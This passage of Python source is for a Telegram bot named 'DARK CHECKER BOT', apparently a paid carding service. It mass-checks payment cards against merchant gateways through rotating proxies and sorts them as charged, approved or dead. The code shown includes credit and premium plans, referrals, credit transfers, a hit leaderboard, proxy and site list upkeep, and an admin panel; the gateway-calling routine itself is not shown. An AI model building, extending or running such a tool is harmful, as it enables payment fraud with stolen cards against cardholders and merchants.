            await send_log_to_channel(response_msg, gateway, price, username, user_id, card)
            await send_realtime_hit_to_user(user_id, "CHARGED", card, response_msg, gateway, price)
        elif status == 'Approved':
            approved_count += 1
            record_hit(user_id, "approved")
            await send_realtime_hit_to_user(user_id, "APPROVED", card, response_msg, gateway, price)
        else:
            dead_count += 1
            record_hit(user_id, "dead")

        if not is_admin(user_id):
            deduct_credit(user_id)

        if (i + 1) % 5 == 0 or i == len(lines_to_check) - 1:
            try:
                await status_msg.edit(
                    f"🔄 <b>Mass Check...</b>\n\n"
                    f"💳 Line: {i+1}/{len(lines_to_check)}\n"
                    f"⚡ Charged: {charged_count}\n"
                    f"💀 Approved: {approved_count}\n"
                    f"⬛ Dead: {dead_count}",
                    parse_mode='html'
                )
            except:
                pass

        if not is_admin(user_id):
            current_credits = get_user_credits(user_id)
            if current_credits <= 0:
                break

    summary = f"""✅ <b>Mass Check Complete!</b>
<b>─────────────────────</b>
<b>💳 Lines Checked:</b> {len(lines_to_check)}
<b>⚡ Charged:</b> {charged_count}
<b>💀 Approved:</b> {approved_count}
<b>⬛ Dead:</b> {dead_count}
<b>─────────────────────</b>
<b>📋 Plan:</b> {get_user_plan_name(user_id)}
<b>💰 Credits Left:</b> {get_user_credits(user_id)}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    try:
        await status_msg.edit(summary, parse_mode='html')
    except:
        await status_msg.edit(summary)

    await check_credits_low(user_id)

@bot.on(events.NewMessage(pattern=r'^/myhistory(@\w+)?(\s+.*)?$'))
async def myhistory(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    hit_data = load_hit_stats()
    uid = str(user_id)
    user_stats = hit_data.get(uid, {"charged": 0, "approved": 0, "dead": 0, "total": 0})

    text = f"""<b>📊 YOUR HISTORY</b>
<b>─────────────────────</b>
<b>⚡ Charged:</b> {user_stats.get('charged', 0)}
<b>💀 Approved:</b> {user_stats.get('approved', 0)}
<b>⬛ Dead:</b> {user_stats.get('dead', 0)}
<b>📊 Total:</b> {user_stats.get('total', 0)}
<b>─────────────────────</b>
<b>📋 Plan:</b> {get_user_plan_name(user_id)}
<b>💰 Credits:</b> {get_user_credits(user_id)}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/topusers(@\w+)?(\s+.*)?$'))
async def topusers(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    hit_data = load_hit_stats()
    if not hit_data:
        return await event.reply("❌ No stats yet!", parse_mode='html')

    sorted_users = sorted(hit_data.items(), key=lambda x: x[1].get('charged', 0) + x[1].get('approved', 0), reverse=True)

    text = "<b>🏆 TOP USERS</b>\n<b>─────────────────────</b>\n"
    for i, (uid, stats) in enumerate(sorted_users[:10]):
        charged = stats.get('charged', 0)
        approved = stats.get('approved', 0)
        total = stats.get('total', 0)
        medal = "🥇" if i == 0 else "🥈" if i == 1 else "🥉" if i == 2 else "👤"
        text += f"{medal} <b><code>{uid}</code></b> ⚡{charged} 💀{approved} 📊{total}\n"

    text += "<b>─────────────────────</b>\n"
    text += "🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"

    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/refer(@\w+)?(\s+.*)?$'))
async def refer(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    bot_username = (await bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={user_id}"

    referrals = load_referrals()
    uid = str(user_id)
    total_earned = referrals.get(uid, {}).get('total_earned', 0)

    text = f"""<b>🔗 YOUR REFERRAL LINK</b>
<b>─────────────────────</b>
<b>Link:</b> <code>{ref_link}</code>
<b>💰 Earned from referrals:</b> {total_earned} credits
<b>🎁 Reward per referral:</b> {REFERRAL_REWARD} credits
<b>─────────────────────</b>
Share this link to earn credits!
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/transfercredits(@\w+)?(\s+.*)?$'))
async def transfercredits(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 3:
        return await event.reply("❌ Usage: <code>/transfercredits user_id amount</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply("❌ Invalid user_id or amount!", parse_mode='html')

    if amount <= 0:
        return await event.reply("❌ Amount must be positive!", parse_mode='html')

    my_credits = get_user_credits(user_id)
    if my_credits < amount:
        return await event.reply(f"❌ You don't have enough credits!\n\n💰 Your balance: {my_credits}", parse_mode='html')

    remove_credits(user_id, amount)
    add_credits(target_id, amount)

    await event.reply(
        f"✅ <b>Transfer Successful!</b>\n\n"
        f"👤 To: <code>{target_id}</code>\n"
        f"💰 Amount: {amount} credits\n"
        f"💰 Your new balance: {get_user_credits(user_id)}",
        parse_mode='html')

    try:
        await bot.send_message(target_id,
            f"💰 <b>Credits Received!</b>\n\n"
            f"👤 From: <code>{user_id}</code>\n"
            f"💰 Amount: {amount} credits\n"
            f"💰 New Balance: {get_user_credits(target_id)}",
            parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/ping(@\w+)?(\s+.*)?$'))
async def ping(event):
    import time as time_module
    start = time_module.time()
    msg = await event.reply("🏓 Pong!")
    end = time_module.time()
    latency = round((end - start) * 1000)

    await msg.edit(
        f"🏓 <b>Pong!</b>\n\n"
        f"⚡ Latency: <code>{latency}ms</code>\n"
        f"📊 Sites: <code>{len(load_sites())}</code>\n"
        f"🔌 Proxies: <code>{len(load_proxies())}</code>\n"
        f"💎 Premium Users: <code>{len(load_premium_users())}</code>",
        parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myproxy(@\w+)?(\s+)?'))
async def myproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    if not is_premium(user_id):
        return await event.reply("❌ <b>Premium only!</b>\n\nUse /plans to upgrade.", parse_mode='html')

    full_text = event.message.text
    lines = full_text.strip().split('\n')

    if len(lines) < 2:
        user_proxies = get_user_specific_proxies(user_id)
        if user_proxies:
            proxies_text = "\n".join([f"🔌 <code>{p}</code>" for p in user_proxies[:20]])
            await event.reply(
                f"🔌 <b>Your Proxies ({len(user_proxies)})</b>\n\n"
                f"{proxies_text}\n\n"
                f"<b>To add:</b> Send new proxies after /myproxy",
                parse_mode='html')
        else:
            await event.reply(
                "❌ You have no custom proxies.\n\n"
                "Usage:\n<code>/myproxy</code>\n<code>ip:port:user:pass</code>\n<code>ip:port:user:pass</code>",
                parse_mode='html')
        return

    proxy_lines = [p.strip() for p in lines[1:] if p.strip()]

    data = load_user_proxies()
    uid = str(user_id)
    if uid not in data:
        data[uid] = []
    data[uid] = proxy_lines
    save_user_proxies(data)

    await event.reply(f"✅ <b>Your Proxies Updated!</b>\n\n🔌 Total: {len(proxy_lines)} proxies saved.", parse_mode='html')

@bot.on(events.CallbackQuery())
async def callback_handler(event):
    data = event.data.decode('utf-8')

    if data == 'get_sites_file':
        user_id = event.sender_id
        if is_banned(user_id):
            await event.answer("🚫 You are banned!", alert=True)
            return

        if not os.path.exists(SITES_FILE):
            await event.answer("❌ sites.txt not found!", alert=True)
            return

        sites = get_file_lines(SITES_FILE)
        if not sites:
            await event.answer("❌ sites.txt is empty!", alert=True)
            return

        try:
            await bot.send_file(user_id, SITES_FILE,
                caption=f"📄 <b>Sites File</b>\n\n📊 Total Sites: {len(sites)}\n\n🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>",
                parse_mode='html')
            await event.answer("✅ File sent!", alert=True)
        except Exception as e:
            await event.answer(f"❌ Failed: {e}", alert=True)

    elif data == 'get_proxy_file':
        user_id = event.sender_id
        if is_banned(user_id):
            await event.answer("🚫 You are banned!", alert=True)
            return

        if not os.path.exists(PROXY_FILE):
            await event.answer("❌ proxy.txt not found!", alert=True)
            return

        proxies = get_file_lines(PROXY_FILE)
        if not proxies:
            await event.answer("❌ proxy.txt is empty!", alert=True)
            return

        try:
            await bot.send_file(user_id, PROXY_FILE,
                caption=f"🔌 <b>Proxy File</b>\n\n📊 Total Proxies: {len(proxies)}\n\n🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>",
                parse_mode='html')
            await event.answer("✅ File sent!", alert=True)
        except Exception as e:
            await event.answer(f"❌ Failed: {e}", alert=True)

    elif data.startswith('filter_'):
        filter_key = data.replace('filter_', '')
        global ACTIVE_FILTER
        if filter_key in SITE_FILTERS:
            ACTIVE_FILTER = filter_key
            await event.answer(f"✅ Filter: {SITE_FILTERS[filter_key]['name']}", alert=True)
        else:
            await event.answer("❌ Invalid filter!", alert=True)

    elif data == 'admin_panel':
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.answer("❌ Admin only!", alert=True)
            return

        sites_count = len(load_sites())
        proxies_count = len(load_proxies())
        premium_count = len(load_premium_users())
        credits_data = load_credits()
        total_users = len(credits_data)

        panel_text = f"""<b>🔑 ADMIN PANEL</b>
<b>─────────────────────</b>
<b>👥 Total Users:</b> {total_users}
<b>💎 Premium Users:</b> {premium_count}
<b>📊 Sites:</b> {sites_count}
<b>🔌 Proxies:</b> {proxies_count}
<b>🎯 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}
<b>─────────────────────</b>
<b>Admin Commands:</b>
➡️ /addpremium user_id plan
➡️ /removepremium user_id
➡️ /addcredits user_id amount
➡️ /removecredits user_id amount
➡️ /ban user_id
➡️ /unban user_id
➡️ /genpremiumkey plan [qty]
➡️ /gencreditkey credits [qty]
➡️ /broadcast (reply to msg)
➡️ /groupmode on|off
➡️ /filter preset_name
➡️ /site (check all sites)
➡️ /addsite (multi-line)
➡️ /addsitetxt (reply to .txt)
➡️ /rm site_url
➡️ /clearsite
➡️ /proxy (check all proxies)
➡️ /addproxy (multi-line)
➡️ /addproxytxt (reply to .txt)
➡️ /stats
➡️ /ping
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

        await event.edit(panel_text, parse_mode='html')

    else:
        await event.answer("Unknown action", alert=True)

# ========== BACKGROUND TASKS ==========

async def cleanup_expired_users():
    while True:
        try:
            premium_data = load_premium_users()
            now = datetime.now()
            removed = 0
            for uid, info in list(premium_data.items()):
                try:
                    expiry = datetime.fromisoformat(info['expiry'])
                    if now > expiry:
                        del premium_data[uid]
                        removed += 1
                except:
                    continue
            if removed > 0:
                save_premium_users(premium_data)
                print(f"✅ Cleaned {removed} expired premium users")
        except Exception as e:
            print(f"❌ Cleanup error: {e}")
        await asyncio.sleep(3600)

async def auto_check_proxies():
    while True:
        await asyncio.sleep(7200)
        try:
            proxies = load_proxies()
            if not proxies:
                continue

            alive_proxies = []
            dead_count = 0
            batch_size = 10

            for i in range(0, len(proxies), batch_size):
                batch = proxies[i:i + batch_size]
                tasks = [test_proxy(proxy) for proxy in batch]
                results = await asyncio.gather(*tasks)

                for res in results:
                    if res['status'] == 'alive':
                        alive_proxies.append(res['proxy'])
                    else:
                        dead_count += 1

            async with aiofiles.open(PROXY_FILE, 'w') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")

            print(f"✅ Auto proxy check: {len(alive_proxies)} alive, {dead_count} removed")
        except Exception as e:
            print(f"❌ Auto proxy check error: {e}")

async def auto_check_sites():
    while True:
        await asyncio.sleep(10800)
        try:
            sites = load_sites()
            proxies = load_proxies()
            if not sites or not proxies:
                continue

            alive_sites = []
            dead_count = 0
            batch_size = 10

            for i in range(0, len(sites), batch_size):
                batch = sites[i:i + batch_size]
                tasks = [test_site(s, random.choice(proxies)) for s in batch]
                results = await asyncio.gather(*tasks)

                for res in results:
                    if res['status'] == 'alive':
                        alive_sites.append(res['site'])
                    else:
                        dead_count += 1

            async with aiofiles.open(SITES_FILE, 'w') as f:
                for site in alive_sites:
                    await f.write(f"{site}\n")

            print(f"✅ Auto site check: {len(alive_sites)} alive, {dead_count} removed")
        except Exception as e:
            print(f"❌ Auto site check error: {e}")

# ========== MAIN ==========
async def main():
    os.makedirs('sessions', exist_ok=True)

    # Start the bot (async)
    await bot.start(bot_token=BOT_TOKEN)

    # Resolve required chat IDs
    await resolve_chat_ids()

    # Start background tasks
    asyncio.create_task(cleanup_expired_users())
    asyncio.create_task(auto_check_proxies())
    asyncio.create_task(auto_check_sites())

    print("🤖 DARK CHECKER BOT is running...")
    print(f"📊 Sites loaded: {len(load_sites())}")
    print(f"🔌 Proxies loaded: {len(load_proxies())}")
    print(f"💎 Premium users: {len(load_premium_users())}")

    # Keep running
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
